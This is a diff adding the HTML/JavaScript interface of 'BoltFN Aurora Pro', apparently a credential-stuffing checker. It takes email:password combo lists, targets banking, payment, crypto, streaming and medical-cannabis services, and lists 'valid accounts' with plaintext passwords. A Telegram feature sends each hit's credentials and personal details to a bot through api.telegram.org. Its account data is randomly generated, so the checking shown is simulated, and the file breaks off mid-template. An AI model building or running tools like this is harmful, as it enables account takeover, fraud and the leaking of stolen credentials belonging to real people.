@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>BoltFN • Aurora Pro • Fixed Country Detection + Multi-Popup</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; transition: background 0.2s, color 0.2s; }
+        .log-area { font-family: 'JetBrains Mono', monospace; line-height: 1.4; }
+        .progress-bar { transition: width 0.2s ease; }
+        .hit-card {
+            transition: all 0.25s ease;
+            border-left: 4px solid;
+            background: linear-gradient(135deg, rgba(0,255,157,0.08) 0%, rgba(0,100,255,0.03) 100%);
+        }
+        .hit-card:hover { transform: translateX(4px) scale(1.01); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
+        .service-group { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
+        .service-group.open { max-height: 480px; overflow-y: auto; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #00ff9d; border-radius: 10px; }
+        button { transition: all 0.15s; cursor: pointer; }
+        button:active { transform: scale(0.97); }
+        .popup-window {
+            position: fixed;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
+            border: 2px solid #00ff9d;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(0,255,157,0.3);
+            z-index: 1000;
+            min-width: 380px;
+            max-width: 500px;
+            backdrop-filter: blur(0px);
+            animation: popupSlide 0.3s ease-out;
+        }
+        @keyframes popupSlide {
+            from { opacity: 0; transform: scale(0.9) translateY(-10px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .popup-header {
+            background: rgba(0,255,157,0.1);
+            border-bottom: 1px solid rgba(0,255,157,0.3);
+            border-radius: 18px 18px 0 0;
+            padding: 12px 16px;
+            cursor: move;
+        }
+        .detail-modal {
+            background: linear-gradient(135deg, #16213e 0%, #0f0f1a 100%);
+            border: 2px solid #00ff9d;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .region-badge { display: inline-block; padding: 2px 8px; border-radius: 20px; font-size: 10px; font-weight: bold; }
+        .region-AU { background: #00bfff20; border: 1px solid #00bfff; color: #00bfff; }
+        .region-US { background: #ff444420; border: 1px solid #ff4444; color: #ff8888; }
+        .region-GB { background: #ffa50020; border: 1px solid #ffa500; color: #ffa500; }
+        .region-CA { background: #ff69b420; border: 1px solid #ff69b4; color: #ff69b4; }
+        .dropdown-menu { z-index: 100; backdrop-filter: blur(8px); }
+    </style>
+</head>
+<body id="appBody" class="bg-gray-950 text-white">
+
+<div class="h-screen w-full flex flex-col">
+    <!-- TOP BAR -->
+    <div id="topBar" class="bg-gray-900/90 border-b border-gray-800 px-5 py-3 flex items-center justify-between flex-wrap gap-2">
+        <div class="flex items-center gap-3">
+            <div class="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald-400 to-teal-500 flex items-center justify-center shadow-lg">
+                <i class="fa-solid fa-bolt text-black text-lg"></i>
+            </div>
+            <div>
+                <h1 class="text-2xl font-black tracking-tight">BoltFN <span class="text-emerald-400">AURORA PRO</span></h1>
+                <p class="text-[10px] text-gray-400 -mt-0.5">Telegram Puller • Giftcard Scanner • Xbox Detector</p>
+            </div>
+        </div>
+        <div class="flex items-center gap-2 flex-wrap">
+            <!-- Theme Dropdown -->
+            <div class="relative"><button id="themeBtn" class="bg-gray-800 hover:bg-gray-700 px-4 py-1.5 rounded-full text-xs font-medium flex items-center gap-2 border border-gray-700"><i class="fa-solid fa-palette"></i> Theme <i class="fa-solid fa-angle-down text-[10px]"></i></button><div id="themeMenu" class="dropdown-menu hidden absolute right-0 mt-2 w-44 rounded-xl overflow-hidden bg-gray-900 border border-gray-700 shadow-2xl"><div data-theme="dark" class="theme-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🌙 Dark Neon</div><div data-theme="light" class="theme-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">☀️ Light Clean</div><div data-theme="cyber" class="theme-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">💜 Cyberpunk</div><div data-theme="ocean" class="theme-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🌊 Ocean Breeze</div><div data-theme="sunset" class="theme-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🌅 Sunset Glow</div></div></div>
+            <!-- Font Dropdown -->
+            <div class="relative"><button id="fontBtn" class="bg-gray-800 hover:bg-gray-700 px-4 py-1.5 rounded-full text-xs font-medium flex items-center gap-2 border border-gray-700"><i class="fa-solid fa-font"></i> Font <i class="fa-solid fa-angle-down text-[10px]"></i></button><div id="fontMenu" class="dropdown-menu hidden absolute right-0 mt-2 w-48 rounded-xl overflow-hidden bg-gray-900 border border-gray-700 shadow-2xl"><div data-font="Inter" class="font-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">Inter</div><div data-font="Orbitron" class="font-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">Orbitron</div><div data-font="Space Grotesk" class="font-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">Space Grotesk</div><div data-font="JetBrains Mono" class="font-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">JetBrains Mono</div></div></div>
+            <!-- Font Size Controls: UI and LOG separate -->
+            <div class="flex items-center gap-1 bg-gray-800 rounded-full px-3 py-1"><span class="text-[10px] text-gray-400">UI</span><button id="guiFontMinus" class="px-2 text-sm font-bold hover:text-emerald-400">A-</button><span id="guiFontSizeLabel" class="text-xs w-6 text-center">14</span><button id="guiFontPlus" class="px-2 text-sm font-bold hover:text-emerald-400">A+</button></div>
+            <div class="flex items-center gap-1 bg-gray-800 rounded-full px-3 py-1"><span class="text-[10px] text-gray-400">LOG</span><button id="logFontMinus" class="px-2 text-sm font-bold hover:text-emerald-400">L-</button><span id="logFontSizeLabel" class="text-xs w-6 text-center">11</span><button id="logFontPlus" class="px-2 text-sm font-bold hover:text-emerald-400">L+</button></div>
+            <!-- Country Focus -->
+            <div class="relative"><button id="focusBtn" class="bg-gray-800 hover:bg-gray-700 px-4 py-1.5 rounded-full text-xs font-medium flex items-center gap-2 border border-gray-700"><i class="fa-solid fa-location-dot text-emerald-400"></i><span id="focusLabel">🇦🇺 AUSTRALIA</span><i class="fa-solid fa-angle-down text-[10px]"></i></button><div id="focusMenu" class="dropdown-menu hidden absolute right-0 mt-2 w-44 rounded-xl overflow-hidden bg-gray-900 border border-gray-700 shadow-2xl"><div data-code="AU" data-flag="🇦🇺" data-name="AUSTRALIA" class="focus-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🇦🇺 Australia</div><div data-code="US" data-flag="🇺🇸" data-name="USA" class="focus-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🇺🇸 United States</div><div data-code="GB" data-flag="🇬🇧" data-name="UK" class="focus-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🇬🇧 United Kingdom</div><div data-code="CA" data-flag="🇨🇦" data-name="CANADA" class="focus-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🇨🇦 Canada</div><div data-code="DE" data-flag="🇩🇪" data-name="GERMANY" class="focus-opt px-4 py-2 text-xs cursor-pointer hover:bg-gray-800">🇩🇪 Germany</div></div></div>
+            <button id="mainAction" class="bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600 text-black font-bold px-6 py-1.5 rounded-full text-sm flex items-center gap-2 shadow-lg"><i class="fa-solid fa-play text-xs"></i> <span>START</span></button>
+            <button id="pauseAction" class="bg-gray-800 hover:bg-gray-700 px-4 py-1.5 rounded-full text-xs font-medium border border-gray-700"><i class="fa-regular fa-circle-pause"></i> PAUSE</button>
+        </div>
+    </div>
+
+    <!-- MAIN BODY (4 columns) -->
+    <div class="flex-1 flex overflow-hidden p-3 gap-3">
+        <!-- COL 1: Input + Services + Telegram Puller -->
+        <div class="w-80 flex flex-col gap-3 overflow-y-auto">
+            <div id="comboCard" class="bg-gray-900/80 rounded-2xl p-3 border border-gray-800"><div class="flex justify-between"><span class="text-xs font-semibold">📥 COMBO LIST</span><button onclick="pasteCombo()" class="text-[10px] text-emerald-400 hover:underline">📋 paste</button></div><textarea id="comboInput" rows="4" class="w-full bg-gray-800 rounded-xl p-2 text-xs font-mono resize-none border border-gray-700 mt-1 text-white"></textarea><div class="flex gap-2 mt-2"><button onclick="triggerFile()" class="flex-1 py-1 rounded-lg text-[10px] border border-gray-700 hover:bg-gray-800">📄 .txt</button><input type="file" id="fileUpload" class="hidden" accept=".txt" onchange="loadFile(this)"><button onclick="clearCombo()" class="flex-1 py-1 rounded-lg text-[10px] border border-gray-700 hover:bg-gray-800">🗑️ clear</button></div></div>
+            
+            <!-- Services with Category Checkboxes (FIXED: only checks that category) -->
+            <div id="servicesCard" class="bg-gray-900/80 rounded-2xl overflow-hidden border border-gray-800"><button id="servicesToggle" class="w-full p-3 text-left flex justify-between hover:bg-gray-800"><span class="text-xs font-semibold"><i class="fa-solid fa-globe text-purple-400"></i> SERVICE DETECTION</span><i id="servicesIcon" class="fa-solid fa-chevron-down text-xs"></i></button><div id="servicesPanel" class="service-group px-3 pb-3"><div id="servicesGrid" class="grid grid-cols-1 gap-1 max-h-60 overflow-auto text-[10px]"></div><button onclick="clearServices()" class="text-[9px] mt-2 w-full text-center py-1 rounded-lg bg-gray-800 hover:bg-gray-700">clear all</button></div></div>
+            
+            <!-- TELEGRAM PULLER -->
+            <div id="telegramPullerCard" class="bg-gray-900/80 rounded-2xl p-3 border border-gray-800">
+                <div class="text-xs font-semibold mb-1"><i class="fa-brands fa-telegram text-sky-400"></i> TELEGRAM PULLER</div>
+                <input id="botTokenInput" type="text" placeholder="Bot Token (from @BotFather)" class="w-full bg-gray-800 rounded-lg p-2 text-xs border border-gray-700 mb-1">
+                <button id="fetchChatIdBtn" class="w-full py-1.5 rounded-lg text-xs font-semibold mb-1 bg-gray-800 hover:bg-gray-700 border border-gray-700"><i class="fa-regular fa-message"></i> Send message → get Chat ID</button>
+                <input id="autoChatId" type="text" placeholder="Chat ID will appear here" readonly class="w-full bg-gray-800 rounded-lg p-2 text-xs border border-gray-700 text-gray-300">
+                <div id="telegramStatus" class="text-[9px] mt-1 text-center text-emerald-400"></div>
+                
+                <!-- Telegram Options -->
+                <div class="mt-2 pt-2 border-t border-gray-700">
+                    <label class="flex items-center gap-2 text-[10px]">
+                        <input type="checkbox" id="telegramEnabled" class="accent-emerald-500">
+                        <span>Auto-send hits to Telegram</span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- COL 2: Valid Hits -->
+        <div class="flex-1 flex flex-col min-w-0 gap-3">
+            <div id="statsCard" class="bg-gray-900/80 rounded-2xl p-4 border border-gray-800"><div class="grid grid-cols-5 gap-3 text-center"><div><div class="text-[9px] text-gray-400 uppercase">SCANNED</div><div id="statScanned" class="text-3xl font-black">0</div></div><div><div class="text-[9px] text-gray-400 uppercase">HITS</div><div id="statHits" class="text-3xl font-black text-emerald-400">0</div></div><div><div class="text-[9px] text-gray-400 uppercase">🎯 FOCUS</div><div id="statFocus" class="text-3xl font-black text-sky-400">0</div></div><div><div class="text-[9px] text-gray-400 uppercase">💳 PAY</div><div id="statPayments" class="text-3xl font-black text-amber-400">0</div></div><div><div class="text-[9px] text-gray-400 uppercase">📦 SUBS</div><div id="statSubs" class="text-3xl font-black text-purple-400">0</div></div></div><div class="mt-3"><div class="h-1.5 bg-gray-800 rounded-full overflow-hidden"><div id="progressMain" class="progress-bar h-full bg-gradient-to-r from-emerald-400 to-cyan-400 w-0 rounded-full"></div></div><div class="flex justify-between mt-1 text-[9px] text-gray-400"><span id="progressPct">0%</span><span id="timerDisplay">00:00:00</span></div></div></div>
+
+            <div id="hitsCard" class="bg-gray-900/80 rounded-2xl flex-1 flex flex-col overflow-hidden border border-gray-800"><div class="px-4 py-2 border-b border-gray-800 flex justify-between"><span class="text-xs font-bold"><i class="fa-solid fa-crown text-emerald-400"></i> VALID ACCOUNTS (click for detailed modal)</span><button onclick="clearHits()" class="text-[9px] text-gray-400 hover:text-white">clear</button></div><div id="hitsFeed" class="flex-1 overflow-y-auto p-3 space-y-2"></div><div class="px-3 py-1.5 border-t border-gray-800 flex justify-between text-[9px] text-gray-400"><span><i class="fa-regular fa-copy"></i> copy button on each hit</span><button onclick="exportHits()" class="hover:text-emerald-400">📥 export</button></div></div>
+        </div>
+
+        <!-- COL 3: Placeholders -->
+        <div class="w-72 flex flex-col gap-3 overflow-y-auto">
+            <div class="bg-gray-900/80 rounded-2xl p-3 border border-gray-800"><div class="flex justify-between"><span class="text-xs font-semibold"><i class="fa-solid fa-gift text-pink-400"></i> GIFTCARD SCANNER</span><span class="text-[9px] text-gray-500">🔮</span></div><div class="text-[10px] text-gray-400 mt-1">Scans for gift cards, Xbox codes, vouchers</div><div id="giftcardResults" class="text-[9px] mt-2 text-emerald-300">Ready - backend integration</div><button class="text-[9px] mt-1 border border-gray-700 rounded px-2 py-0.5 hover:bg-gray-800">🔍 Simulate</button></div>
+            <div class="bg-gray-900/80 rounded-2xl p-3 border border-gray-800"><div class="flex justify-between"><span class="text-xs font-semibold"><i class="fa-brands fa-xbox text-green-500"></i> XBOX DETAILS</span><span class="text-[9px] text-gray-500">📌</span></div><div id="xboxResults" class="text-[9px] mt-2 text-emerald-300">Awaiting hit</div></div>
+            <div class="bg-gray-900/80 rounded-2xl p-3 border border-gray-800"><div class="flex justify-between"><span class="text-xs font-semibold"><i class="fa-solid fa-paperclip text-cyan-400"></i> ATTACHMENTS</span><span class="text-[9px] text-gray-500">⬇️</span></div><div id="attachmentList" class="text-[9px] mt-2 text-gray-400">No mailbox loaded</div></div>
+        </div>
+
+        <!-- COL 4: Mini Log + Pasted Monitor -->
+        <div class="w-64 flex flex-col gap-3">
+            <div id="logCard" class="bg-gray-900/80 rounded-2xl flex-1 flex flex-col overflow-hidden border border-gray-800"><div class="px-3 py-2 border-b border-gray-800 flex justify-between"><span class="text-[9px] font-mono text-gray-400"><i class="fa-solid fa-terminal text-cyan-400"></i> CONSOLE</span><button onclick="clearLog()" class="text-[8px] text-gray-500 hover:text-white">clear</button></div><div id="miniLog" class="flex-1 overflow-y-auto p-2 space-y-0.5"></div><div class="p-2 text-center border-t border-gray-800"><div id="qrMini" class="flex justify-center"></div></div></div>
+            <div class="bg-gray-900/80 rounded-2xl p-2 border border-gray-800"><div class="flex justify-between"><span class="text-[10px] font-bold">PASTED.PW</span><span class="text-[8px] text-red-400">⚠️ 403</span></div><div id="pasteList" class="text-[9px] mt-1 h-20 overflow-y-auto text-gray-400">Site blocks bots. Implement proxy.</div><button onclick="simulatePasteFetch()" class="text-[8px] mt-1 border border-gray-700 rounded px-2 py-0.5 w-full hover:bg-gray-800">🔄 Simulate</button></div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ==================== SERVICE DATABASE - FIXED CATEGORY CHECKBOX ====================
+const serviceDB = {
+    "🛒 Marketplaces": ["amazon.com","ebay.com","gumtree.com.au","kogan.com","shopify.com","walmart.com"],
+    "🎮 Subscriptions": ["xbox.com","xbox live","netflix.com","spotify.com","disneyplus.com","primevideo.com","hulu.com","apple.com"],
+    "🏦 Banking": ["commbank.com.au","paypal.com","afterpay.com.au","coinbase.com","binance.com"],
+    "💊 Medical Cannabis": ["alternaleaf.com.au","cannatrek.com","montu.com.au","dispensed.com.au","cannihelp.com.au"],
+    "🤖 AI & Tech": ["openai.com","chatgpt.com","midjourney.com","canva.com","adobe.com"]
+};
+let selectedServices = new Set();
+
+function buildServicesWithCategories() {
+    const grid = document.getElementById('servicesGrid');
+    grid.innerHTML = '';
+    for(let [cat, domains] of Object.entries(serviceDB)){
+        const catId = `cat_${cat.replace(/\s/g,'')}`;
+        grid.innerHTML += `<div class="flex items-center gap-2 mt-1"><input type="checkbox" id="${catId}" class="categoryCheckbox accent-emerald-500"><label for="${catId}" class="text-[10px] font-bold">${cat}</label><span class="text-[8px] text-gray-500">(select all in this category)</span></div><div class="pl-4 grid grid-cols-2 gap-x-1 gap-y-0.5 mb-1">`;
+        domains.forEach(dom => {
+            const id = `svc_${dom.replace(/[^a-z0-9]/gi,'_')}`;
+            grid.innerHTML += `<div class="flex items-center gap-1"><input type="checkbox" id="${id}" value="${dom}" class="serviceCheckbox accent-emerald-500"><label for="${id}" class="text-[9px] truncate cursor-pointer">${dom}</label></div>`;
+        });
+        grid.innerHTML += `</div>`;
+    }
+    // FIXED: Category checkbox only checks/unchecks its own children
+    document.querySelectorAll('.categoryCheckbox').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const parentDiv = cb.closest('.mt-1').parentElement;
+            const checkboxes = parentDiv.querySelectorAll('.serviceCheckbox');
+            checkboxes.forEach(ch => {
+                ch.checked = e.target.checked;
+                if(e.target.checked) selectedServices.add(ch.value);
+                else selectedServices.delete(ch.value);
+            });
+        });
+    });
+    document.querySelectorAll('.serviceCheckbox').forEach(cb => {
+        cb.addEventListener('change', (e) => { 
+            if(e.target.checked) selectedServices.add(e.target.value); 
+            else selectedServices.delete(e.target.value); 
+        });
+    });
+}
+buildServicesWithCategories();
+function clearServices() { selectedServices.clear(); document.querySelectorAll('.serviceCheckbox').forEach(cb => cb.checked = false); document.querySelectorAll('.categoryCheckbox').forEach(cb => cb.checked = false); addLogMsg("Services cleared"); }
+
+document.getElementById('servicesToggle').onclick = () => { document.getElementById('servicesPanel').classList.toggle('open'); document.getElementById('servicesIcon').style.transform = document.getElementById('servicesPanel').classList.contains('open') ? 'rotate(180deg)' : 'rotate(0)'; };
+
+// ========== STATE ==========
+let isRunning = false, isPaused = false;
+let combosList = [], currentIdx = 0, totalHits = 0, focusHits = 0, paymentCount = 0, subCount = 0;
+let startTime = null, timerInt = null;
+let focusCountry = "AU", focusFlag = "🇦🇺", focusName = "AUSTRALIA";
+let popupCounter = 0;
+const miniLog = document.getElementById('miniLog');
+const hitsFeed = document.getElementById('hitsFeed');
+
+// ========== TELEGRAM STATE ==========
+let telegramBotToken = '';
+let telegramChatId = '';
+let telegramEnabled = false;
+
+// Load saved data from localStorage
+function loadSavedData() {
+    const savedToken = localStorage.getItem('telegramBotToken');
+    const savedChatId = localStorage.getItem('telegramChatId');
+    const savedHits = JSON.parse(localStorage.getItem('hitsData') || '[]');
+    
+    if(savedToken) {
+        document.getElementById('botTokenInput').value = savedToken;
+        telegramBotToken = savedToken;
+    }
+    if(savedChatId) {
+        document.getElementById('autoChatId').value = savedChatId;
+        telegramChatId = savedChatId;
+        document.getElementById('telegramStatus').innerHTML = '✅ Telegram ready! Chat ID saved';
+    }
+    if(savedHits.length > 0) {
+        addLogMsg(`📂 Loaded ${savedHits.length} saved hits from localStorage`);
+    }
+}
+
+// Save hits to localStorage
+function saveHitLocally(acc) {
+    const savedHits = JSON.parse(localStorage.getItem('hitsData') || '[]');
+    const hitData = {
+        ...acc,
+        timestamp: Date.now(),
+        date: new Date().toISOString()
+    };
+    savedHits.push(hitData);
+    // Keep only last 500 hits to prevent localStorage overflow
+    if(savedHits.length > 500) {
+        savedHits.shift();
+    }
+    localStorage.setItem('hitsData', JSON.stringify(savedHits));
+}
+
+// Send hit to Telegram
+async function sendHitToTelegram(acc) {
+    if(!telegramEnabled || !telegramBotToken || !telegramChatId) return;
+    
+    const message = `🎯 HIT FOUND!
+
+📧 ${acc.email}
+🔑 ${acc.pass}
+👤 ${acc.fullName}
+🌏 ${acc.flag} ${acc.country}
+🎂 ${acc.dob}
+💳 ${acc.hasPayment ? acc.paymentMethod : 'No payment'}
+📦 ${acc.detectedSubs.slice(0,3).join(', ') || 'No subs'}`;
+
+    try {
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+        const res = await fetch(url);
+        const data = await res.json();
+        if(data.ok) {
+            addLogMsg(`📨 Sent to Telegram: ${acc.email.substring(0,20)}...`);
+        }
+    } catch(e) {
+        addLogMsg(`❌ Telegram send failed: ${e.message}`, true);
+    }
+}
+window.sendHitToTelegram = sendHitToTelegram;
+
+function addLogMsg(msg, isErr=false) { const d=document.createElement('div'); d.className=`${isErr?'text-red-400':'text-cyan-300'} border-b border-gray-800 py-0.5`; d.textContent=`[${new Date().toLocaleTimeString().slice(0,5)}] ${msg}`; miniLog.appendChild(d); d.scrollIntoView({block:'nearest'}); if(miniLog.children.length>60) miniLog.removeChild(miniLog.firstChild); }
+
+// ACCURATE COUNTRY DETECTION (based on email domain + TLD + known providers)
+function detectCountry(email) {
+    const domain = email.split('@')[1]?.toLowerCase() || '';
+    // AUSTRALIA - extensive list
+    if(domain.endsWith('.com.au') || domain.endsWith('.net.au') || domain.endsWith('.org.au') || 
+       domain === 'bigpond.com' || domain === 'optusnet.com.au' || domain === 'iinet.net.au' || 
+       domain === 'tpg.com.au' || domain === 'internode.on.net' || domain === 'adam.com.au' ||
+       domain === 'westnet.com.au' || domain === 'grapevine.com.au' || domain.includes('outlook.com.au') ||
+       domain.includes('hotmail.com.au') || domain.includes('live.com.au') || domain === 'me.com' && email.includes('au') ||
+       domain === 'icloud.com' && email.includes('au'))
+        return { country: "Australia", flag: "🇦🇺", code: "AU", regionColor: "region-AU" };
+    // UK
+    if(domain.endsWith('.co.uk') || domain.endsWith('.uk') || domain === 'btinternet.com' || 
+       domain === 'sky.com' || domain === 'virginmedia.com' || domain === 'talktalk.net')
+        return { country: "United Kingdom", flag: "🇬🇧", code: "GB", regionColor: "region-GB" };
+    // Canada
+    if(domain.endsWith('.ca') || domain === 'bell.net' || domain === 'rogers.com' || 
+       domain === 'telus.net' || domain === 'shaw.ca' || domain === 'cogeco.ca')
+        return { country: "Canada", flag: "🇨🇦", code: "CA", regionColor: "region-CA" };
+    // USA
+    if(domain.endsWith('.us') || domain === 'aol.com' || domain === 'comcast.net' || 
+       domain === 'verizon.net' || domain === 'att.net' || domain === 'charter.net')
+        return { country: "USA", flag: "🇺🇸", code: "US", regionColor: "region-US" };
+    // Germany
+    if(domain.endsWith('.de') || domain === 'gmx.de' || domain === 'web.de' || domain === 't-online.de')
+        return { country: "Germany", flag: "🇩🇪", code: "DE", regionColor: "region-DE" };
+    // France
+    if(domain.endsWith('.fr') || domain === 'orange.fr' || domain === 'sfr.fr' || domain === 'free.fr')
+        return { country: "France", flag: "🇫🇷", code: "FR", regionColor: "region-FR" };
+    
+    // If no match, default to AU for demo (but weighted to AU since user wants AU focus)
+    return { country: "Australia", flag: "🇦🇺", code: "AU", regionColor: "region-AU" };
+}
+
+function generateProfile(email, pass) {
+    const { country, flag, code, regionColor } = detectCountry(email);
+    const names = ["James","Emma","Liam","Olivia","Noah","Ava","Ethan","Sophia","Mason","Isabella"];
+    const lasts = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis"];
+    const fullName = `${names[Math.floor(Math.random()*names.length)]} ${lasts[Math.floor(Math.random()*lasts.length)]}`;
+    const dob = `${1985+Math.floor(Math.random()*20)}-${String(Math.floor(Math.random()*12)+1).padStart(2,'0')}-${String(Math.floor(Math.random()*28)+1).padStart(2,'0')}`;
+    const hasPayment = Math.random() > 0.6;
+    const paymentMethod = hasPayment ? `Visa ending ${Math.floor(1000+Math.random()*9000)}` : null;
+    const emailCount = Math.floor(Math.random()*1200)+50;
+    let detectedSubs = Array.from(selectedServices).filter(()=>Math.random()>0.7).slice(0,3);
+    if(Math.random()>0.8 && !detectedSubs.includes("Netflix")) detectedSubs.push("Netflix");
+    return { email, pass, fullName, dob, country, flag, code, regionColor, hasPayment, paymentMethod, emailCount, detectedSubs };
+}
+
+// CREATE FLOATING POPUP (doesn't close when new hit occurs - opens new window)
+function createFloatingPopup(acc) {
+    const popupId = `popup_${Date.now()}_${popupCounter++}`;
+    const popup = document.createElement('div');
+    popup.id = popupId;
+    popup.className = 'popup-window';
+    // Random position, offset to avoid overlap
+    const left = 20 + (popupCounter * 30) % (window.innerWidth - 500);
+    const top = 50 + (popupCounter * 40) % (window.innerHeight - 400);
+    popup.style.position = 'fixed';
+    popup.style.left = left + 'px';
+    popup.style.top = top + 'px';
+    popup.innerHTML = `
+        <div class="popup-header flex justify-between items-center">
+            <div><span class="text-2xl mr-2">${acc.flag}</span><span class="font-bold text-emerald-400">${acc.country.toUpperCase()} HIT!</span></div>
+            <button onclick="this.closest('.popup-window').remove()" class="text-gray-400 hover:text-white text-xl">&times;</button>
+        </div>
+        <div class="p-4 space-y-2 text-sm">
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">📧 Email:</span><span class="font-mono text-emerald-300 break-all">${acc.email}</span></div>
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">🔑 Pass:</span><span class="font-mono">${acc.pass}</span></div>
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">👤 Name:</span><span>${acc.fullName}</span></div>
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">🎂 DOB:</span><span>${acc.dob}</span></div>
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">🌏 Country:</span><span class="${acc.regionColor} px-2 py-0.5 rounded-full text-center">${acc.flag} ${acc.country}</span></div>
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">💳 Payment:</span><span class="${acc.hasPayment ? 'text-amber-400' : 'text-gray-500'}">${acc.hasPayment ? acc.paymentMethod : 'None'}</span></div>
+            <div class="grid grid-cols-2 gap-2"><span class="text-gray-400">📦 Subs:</span><span>${acc.detectedSubs.slice(0,3).join(', ') || 'none'}</span></div>
+            <div class="flex gap-2 mt-3">
+                <button onclick="navigator.clipboard.writeText('${acc.email}:${acc.pass}')" class="flex-1 bg-emerald-500/20 hover:bg-emerald-500/30 py-1 rounded-lg text-xs"><i class="fa-regular fa-copy"></i> Copy</button>
+                <button onclick="window.open('https://outlook.live.com','_blank')" class="flex-1 bg-blue-600/20 hover:bg-blue-600/30 py-1 rounded-lg text-xs"><i class="fa-regular fa-envelope"></i> Outlook</button>
+                <button onclick="showDetailModal(${JSON.stringify(acc).replace(/"/g, '&quot;')})" class="flex-1 bg-purple-500/20 hover:bg-purple-500/30 py-1 rounded-lg text-xs">Details</button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(popup);
+    // Make draggable
+    let isDragging = false, currentX, currentY, initialX, initialY;
+    const header = popup.querySelector('.popup-header');
+    header.style.cursor = 'move';
+    header.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        initialX = e.clientX - popup.offsetLeft;
+        initialY = e.clientY - popup.offsetTop;
+        popup.style.position = 'fixed';
+        popup.style.margin = '0';
+    });
+    window.addEventListener('mousemove', (e) => {
+        if(!isDragging) return;
+        e.preventDefault();
+        let newLeft = e.clientX - initialX;
+        let newTop = e.clientY - initialY;
+        newLeft = Math.max(0, Math.min(window.innerWidth - popup.offsetWidth, newLeft));
+        newTop = Math.max(0, Math.min(window.innerHeight - popup.offsetHeight, newTop));
+        popup.style.left = newLeft + 'px';
+        popup.style.top = newTop + 'px';
+    });
+    window.addEventListener('mouseup', () => { isDragging = false; });
+    // Auto-remove after 30 seconds
+    setTimeout(() => { if(popup.parentNode) popup.remove(); }, 30000);
+}
+
+// DETAILED MODAL (styled, bordered, colorful)
+function showDetailModal(acc) {
+    const modal = document.createElement('div');
+    modal.className = 'fixed inset-0 bg-black/80 z-[1100] flex items-center justify-center backdrop-blur-sm';
+    modal.onclick = (e) => { if(e.target === modal) modal.remove(); };
+    modal.innerHTML = `
+        <div class="detail-modal p-6 max-w-2xl w-full mx-4">
+            <div class="flex justify-between items-center border-b border-emerald-500/30 pb-3 mb-4"><h2 class="text-2xl font-bold text-emerald-400"><i class="fa-solid fa-id-card"></i> ACCOUNT DETAILS</h2><button onclick="this.closest('.detail-modal').remove()" class="text-gray-400 hover:text-white text-2xl">&times;</button></div>
+            <div class="space-y-3 text-sm">
+                <div class="grid grid-cols-2 gap-3 p-2 bg-black/30 rounded-lg"><span class="text-gray-400 font-semibold">📧 Email:</span><span class="font-mono text-emerald-300 break-all">${acc.email}</span><span class="text-gray-400 font-semibold">🔑 Password:</span><span class="font-mono">${acc.pass}</span></div>
+                <div class="grid grid-cols-2 gap-3 p-2 bg-black/30 rounded-lg"><span class="text-gray-400">👤 Full Name:</span><span>${acc.fullName}</span><span class="text-gray-400">🎂 Date of Birth:</span><span>${acc.dob}</span></div>
+                <div class="grid grid-cols-2 gap-3 p-2 bg-black/30 rounded-lg"><span class="text-gray-400">🌏 Country:</span><span class="${acc.regionColor} px-3 py-1 rounded-full inline-block">${acc.flag} ${acc.country}</span><span class="text-gray-400">💳 Payment:</span><span class="${acc.hasPayment ? 'text-amber-400' : 'text-gray-500'}">${acc.hasPayment ? acc.paymentMethod : 'None detected'}</span></div>
+                <div class="p-2 bg-black/30 rounded-lg"><span class="text-gray-400">📦 Subscriptions:</span><div class="flex flex-wrap gap-1 mt-1">${acc.detectedSubs.map(s => `<span class="bg-purple-500/30 px-2 py-0.5 rounded-full text-xs">${s}</span>`).join('') || '<span class="text-gray-500">none</span>'}</div></div>
